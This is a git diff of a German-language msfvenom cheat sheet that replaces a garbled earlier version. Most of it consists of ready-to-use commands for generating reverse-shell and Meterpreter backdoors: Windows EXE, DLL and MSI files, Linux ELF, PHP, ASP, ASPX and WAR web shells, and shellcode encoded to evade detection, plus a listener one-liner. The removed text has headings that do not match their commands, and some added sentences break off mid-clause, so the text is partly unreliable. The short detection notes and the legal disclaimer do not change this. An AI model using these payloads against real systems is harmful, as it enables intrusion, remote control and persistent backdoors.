@@ -1,12 +1,16 @@
-# 💣 Msfvenom – vollständiger Spickzettel
-
 <!-- language-home-navigation -->
 [🏠 Deutsche Startseite](../../README.de.md) • [🌐 Languages](../../README.md#-available-languages)
 
-[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)
+[🇹🇷 Türkçe](README.tr.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md) • [🇮🇹 Italiano](README.it.md)
+
+[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)
+
+---
 
 
+# 💣 Msfvenom – Vollständiger Cheatsheet
 
+[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
 ```
   ███╗   ███╗███████╗███████╗██╗   ██╗███████╗███╗   ██╗ ██████╗ ███╗   ███╗
   ████╗ ████║██╔════╝██╔════╝██║   ██║██╔════╝████╗  ██║██╔═══██╗████╗ ████║
@@ -16,131 +20,118 @@
   ╚═╝     ╚═╝╚══════╝╚═╝       ╚═══╝  ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝
          Metasploit Standalone Payload Generator & Shellcode Encoder
 ```
-
 <p align="center">
   <img src="https://img.shields.io/badge/Msfvenom-Payload_Generator-blue?style=for-the-badge" alt="Msfvenom">
   <img src="https://img.shields.io/badge/Framework-Metasploit-red?style=for-the-badge" alt="Metasploit">
   <img src="https://img.shields.io/badge/Category-Exploit_Payloads-green?style=for-the-badge" alt="Payloads">
-  <img src="https://img.shields.io/badge/Output-Binaries_%7C_Shellcode_%7C_Scripts-purple?style=for-the-badge" alt="Formats">
+  <img src="https://img.shields.io/badge/Output-Binaries_%7C_Shellcode_%7C_Scripts-purple?style=for-the-badge" alt="Formate">
 </p>
 
 <p align="center">
-  <b>💣 Master cheatsheet for generating standalone payloads, shellcode, and backdoors across Windows, Linux, macOS, Android, and Web platforms</b>
+  <b>💣 Master-Cheatsheet zum Generieren eigenständiger Payloads, Shellcodes und Hintertüren auf Windows-, Linux-, macOS-, Android- und Webplattformen</b>
 </p>
 
 ---
 
 ## 📋 Inhaltsverzeichnis
 
-- [Einführung](#-overview--payload-architecture)
-  - [Staged vs Stageless Payloads](#staged-vs-stageless-payloads)
-- [Optionen und Parameter](#-essential-flags--options)
-- [Windows Payloads (EXE, DLL, MSI, PowerShell)](#-windows-payloads-exe-dll-msi-powershell)
-- [Linux & Unix Payloads (ELF, Python, Bash)](#-linux--unix-payloads-elf-python-bash)
-- [Web & Web Shell Payloads (PHP, ASP, ASPX, JSP, WAR)](#-web--web-shell-payloads-php-asp-aspx-jsp-war)
-- [Shellcode Generation for Exploit Development (C, Raw, Python)](#-shellcode-generation-for-exploit-development-c-raw-python)
-  - [Stripping Bad Characters (`-b`)](#stripping-bad-characters--b)
-  - [Tipps und bewährte Vorgehensweisen](#encoders--multiple-iterations--e--i)
-- [Installation](#-metasploit-multi-handler-quick-setup)
-- [Kurzreferenz](#-quick-reference-table)
-- [Defensive Considerations & Detection](#-defensive-considerations--detection)
-- [Legal Disclaimer](#-legal-disclaimer)
+- [Übersicht & Payload-Architektur](#-overview--payload-architecture)
+  - [Inszenierte vs. stufenlose Nutzlasten](#staged-vs-stageless-payloads)
+- [Wichtige Flags und Optionen](#-essential-flags--options)
+- [Windows-Payloads (EXE, DLL, MSI, PowerShell)](#-windows-payloads-exe-dll-msi-powershell)
+- [Linux- und Unix-Payloads (ELF, Python, Bash)](#-linux--unix-payloads-elf-python-bash)
+- [Web- und Web-Shell-Nutzlasten (PHP, ASP, ASPX, JSP, WAR)](#-web--web-shell-payloads-php-asp-aspx-jsp-war)
+- [Shellcode-Generierung für die Exploit-Entwicklung (C, Raw, Python)](#-shellcode-generation-for-exploit-development-c-raw-python)
+  - [Ungültige Zeichen entfernen (`-b`)](#stripping-bad-characters--b)
+  - [Encoder und mehrere Iterationen (`-e`, `-i`)](#encoders--multiple-iterations--e--i)
+- [Metasploit Multi-Handler Quick Setup](#-metasploit-multi-handler-quick-setup)
+- [Kurzreferenztabelle](#-quick-reference-table)
+- [Verteidigungsüberlegungen und Erkennung](#-defensive-überlegungen--erkennung)
+- [Rechtlicher Haftungsausschluss](#-legal-disclaimer)
 
 ---
 
-## 🎯 Einführung
+## 🎯 Übersicht und Nutzlastarchitektur
 
-Combining the classic `msfpayload` and `msfencode` utilities, **msfvenom** generates binary executables, scripts, and raw shellcode for exploitation and penetration testing.
+**msfvenom** kombiniert die klassischen Dienstprogramme `msfpayload` und
 
-### Staged vs Stageless Payloads
-- **Staged (e.g. `windows/x64/meterpreter/reverse_tcp`)**: 
-  Uses slashes between components. A tiny stub (stage 0) connects back to the listener and fetches the full reflective DLL (stage 1) into memory. Ideal for exploits with strict buffer length limits.
-- **Stageless (e.g. `windows/x64/meterpreter_reverse_tcp`)**: 
-  Uses an underscore (`_`). The entire Meterpreter payload is self-contained inside the executable or shellcode. Works reliably without relying on multi-stage network handshakes, making it ideal for command line runners and evasive persistence.
+### Gestaffelte vs. stufenlose Nutzlasten
+- **Stufenweise (z. B. `windows/x64/meterpreter/reverse_tcp`):**
+  Verwendet Schrägstriche zwischen Komponenten. Ein kleiner Stub (Stufe 0) stellt eine Verbindung zum Listener her und ruft die vollständig reflektierende DLL (Stufe 1) in den Speicher ab. Ideal für Exploits mit strengen Pufferlängenbeschränkungen.
+- **Stufenlos (z. B. `windows/x64/meterpreter_reverse_tcp`):**
+  Verwendet einen Unterstrich (`_`). Die gesamte Meterpreter-Nutzlast ist in der ausführbaren Datei oder im Shellcode enthalten. Funktioniert zuverlässig, ohne auf mehrstufige Netzwerk-Handshakes angewiesen zu sein, was es ideal für Befehlszeilen-Runner und Ausweichmanöver macht.
 
 ---
 
-## ⚙️ Optionen und Parameter
-
+## ⚙️ Wichtige Flags und Optionen
 ```bash
 msfvenom -p <PAYLOAD> LHOST=<IP> LPORT=<PORT> -f <FORMAT> -o <OUTPUT_FILE>
 ```
-
-|Flag|Beschreibung|
+| Flagge | Beschreibung |
 |------|-------------|
-|`-p, --payload`|Specifies the payload to use (`--list payloads` to view all).|
-|`-f, --format`|Output format (exe, elf, raw, c, python, asp, aspx, war, php).|
-|`-e, --encoder`|Shellcode encoder to eliminate bad characters (`--list encoders`).|
-|`-i, --iterations`|Number of encoding passes.|
-|`-b, --bad-chars`|Characters to avoid in shellcode (e.g., `\x00\x0a\x0d`).|
-|`-x, --template`|Executable template to inject payload into.|
-|`-k, --keep`|Preserves template's normal execution in a new thread.|
-|`-o, --out`|Output destination file path.|
+| `-p, --payload` | Gibt die zu verwendende Nutzlast an (`--list payloads`, um alle anzuzeigen). |
+| `-f, --format` | Ausgabeformat (exe, elf, raw, c, python, asp, aspx, war, php). |
+| `-e, --encoder` | Shellcode-Encoder zur Beseitigung fehlerhafter Zeichen (`--list encoders`). |
+| `-i, --iterations` | Anzahl der Kodierungsdurchgänge. |
+| `-b, --bad-chars` | Im Shellcode zu vermeidende Zeichen (z. B. `\x00\x0a\x0d`). |
+| `-x, --template` | Ausführbare Vorlage zum Einfügen von Nutzdaten. |
+| `-k, --keep` | Behält die normale Ausführung der Vorlage in einem neuen Thread bei. |
+| `-o, --out` | Pfad der Ausgabezieldatei. |
 
 ---
 
-## 🪟 Windows Payloads (EXE, DLL, MSI, PowerShell)
+## 🪟 Windows-Payloads (EXE, DLL, MSI, PowerShell)
 
-### |`-o, --out`|Output destination file path.|
+### Ausführbare Windows x64 Reverse Shell-Datei (stufenlos)
 ```bash
 msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o shell.exe
 ```
-
-### Windows x64 Staged Reverse TCP Executable
+### Ausführbare Windows x64-Staging-Reverse-TCP-Datei
 ```bash
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o staged.exe
 ```
-
-### Windows x64 Reverse Shell Executable (Stageless)
+### Windows-DLL-Injection-Nutzlast
 ```bash
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f dll -o payload.dll
 ```
-
-### Windows x64 Staged Reverse TCP Executable
+### Windows MSI Installer (Privilegieneskalation über AlwaysInstallElevated)
 ```bash
 msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f msi -o install.msi
 ```
-
-### Windows DLL Injection Payload
+### Base64-codierter PowerShell-Befehl
 ```bash
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f psh-cmd -o run.bat
 ```
-
 ---
 
-## 🐧 Linux & Unix Payloads (ELF, Python, Bash)
+## 🐧 Linux- und Unix-Payloads (ELF, Python, Bash)
 
-### Linux x64 ELF Binary (Stageless)
+### Linux x64 ELF Binär (stufenlos)
 ```bash
 msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o shell.elf
 chmod +x shell.elf
 ```
-
-### Linux Standard `/bin/sh` Reverse TCP (No Meterpreter)
+### Linux Standard `/bin/sh` Reverse TCP (kein Meterpreter)
 ```bash
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o reverse.elf
 ```
-
-### Linux x64 ELF Binary (Stageless)
+### Eigenständiges Python-Reverse-Shell-Skript
 ```bash
 msfvenom -p cmd/unix/reverse_python LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.py
 ```
-
-### Linux Standard `/bin/sh` Reverse TCP (No Meterpreter)
+### Reine Bash-Befehlszeichenfolge
 ```bash
 msfvenom -p cmd/unix/reverse_bash LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.sh
 ```
-
 ---
 
-## 🌐 Web & Web Shell Payloads (PHP, ASP, ASPX, JSP, WAR)
+## 🌐 Web- und Web-Shell-Nutzlasten (PHP, ASP, ASPX, JSP, WAR)
 
 ### PHP Reverse Meterpreter Shell
 ```bash
 msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.php
 ```
-
-### Classic ASP & ASPX (IIS Servers)
+### Klassisches ASP und ASPX (IIS-Server)
 ```bash
 # Classic ASP
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f asp -o shell.asp
@@ -148,65 +139,59 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f a
 # Modern ASPX (.NET)
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f aspx -o shell.aspx
 ```
-
-### PHP Reverse Meterpreter Shell
+### Java WAR-Paket (Apache Tomcat Web Archive)
 ```bash
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f war -o webshell.war
 ```
-
 ---
 
-## 🔬 Shellcode Generation for Exploit Development (C, Raw, Python)
+## 🔬 Shellcode-Generierung für die Exploit-Entwicklung (C, Raw, Python)
 
-### Stripping Bad Characters (`-b`)
-Null bytes (`\x00`), carriage returns (`\r` = `\x0d`), and newlines (`\n` = `\x0a`) break string-based memory corruption exploits (e.g., stack overflows):
+### Schlechte Zeichen entfernen (`-b`)
+Nullbytes (`\x00`), Wagenrückläufe (`\r` =
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 \
   -b '\x00\x0a\x0d' -f c -o shellcode.c
 ```
-
-### Tipps und bewährte Vorgehensweisen
+### Encoder und mehrere Iterationen (`-e`, `-i`)
 ```bash
 # Polymorphic XOR additive feedback encoder
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 \
   -e x86/shikata_ga_nai -i 5 -b '\x00' -f raw -o payload.bin
 ```
-
 ---
 
-## 🎧 Installation
+## 🎧 Metasploit Multi-Handler-Schnelleinrichtung
 
-Always catch payloads using Metasploit's `multi/handler`:
-
+Fangen Sie Nutzlasten immer mit `multi/handler` von Metasploit ab:
 ```bash
 # One-liner handler startup
 msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter_reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; run"
 ```
-
 ---
 
-## ⚡ Kurzreferenz
+## ⚡ Kurzreferenztabelle
 
-|Target Platform|Befehl|
+| Zielplattform | Befehl |
 |-----------------|---------|
-|**Windows x64 EXE**|`msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=4444 -f exe -o run.exe`|
-|**Linux x64 ELF**|`msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=4444 -f elf -o run.elf`|
-|**PHP Web Shell**|`msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=4444 -f raw -o shell.php`|
-|**ASPX (.NET IIS)**|`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f aspx -o shell.aspx`|
-|**Tomcat WAR**|`msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=4444 -f war -o shell.war`|
-|**Raw Shellcode (C)**|`msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -b '\x00' -f c`|
-|**PowerShell One-Liner**|`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f psh-cmd`|
+| **Windows x64 EXE** | `msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=4444 -f exe -o run.exe` |
+| **Linux x64 ELF** | `msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=4444 -f elf -o run.elf` |
+| **PHP-Web-Shell** | `msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=4444 -f raw -o shell.php` |
+| **ASPX (.NET IIS)** | `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f aspx -o shell.aspx` |
+| **Tomcat WAR** | `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=4444 -f war -o shell.war` |
+| **Roh-Shellcode (C)**| `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -b '\x00' -f c` |
+| **PowerShell One-Liner**| `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f psh-cmd` |
 
 ---
 
-## 🛡️ Defensive Considerations & Detection
+## 🛡️ Defensive Überlegungen und Erkennung
 
-1. **Static Signature Detection:** Default Msfvenom templates and encoders (`shikata_ga_nai`) have well-known static signatures identified by virtually every modern antivirus engine.
-2. **Behavioral EDR Monitoring:** EDR agents flag abnormal process spawning (e.g. `cmd.exe` or `powershell.exe` spawned under `w3wp.exe` or `tomcat8.exe`).
+1. **Erkennung statischer Signaturen:** Standardmäßige Msfvenom-Vorlagen und -Encoder (`shikata_ga_nai`) verfügen über bekannte statische Signaturen, die von praktisch jeder modernen Antiviren-Engine identifiziert werden.
+2. **Verhaltensbezogene EDR-Überwachung:** EDR-Agenten kennzeichnen abnormales Prozess-Spawnen (z. B. `cmd.exe` oder `powershell.exe`, das unter `w3wp.exe` oder `tomcat8.exe` erzeugt wurde).
 
 ---
 
-## ⚠️ Legal Disclaimer
+## ⚠️ Rechtlicher Haftungsausschluss
 
-3. **Honeytokens:** Plant attractive DNS records (e.g., `backup-vault.corp.local` or `admin-portal.corp.local`) pointing to honeypot IP addresses.
-> Msfvenom generates functional offensive payloads and backdoors. It must strictly be utilized during authorized penetration tests and within isolated laboratory research environments. Unauthorized generation or execution on third-party computers is illegal.
+> [!ACHTUNG]
+> Msfvenom generiert funktionale offensive Payloads und Hintertüren. Es muss ausschließlich bei autorisierten Penetrationstests und in isolierten Laborforschungsumgebungen verwendet werden. Die unbefugte Generierung oder Ausführung auf Computern Dritter ist illegal.
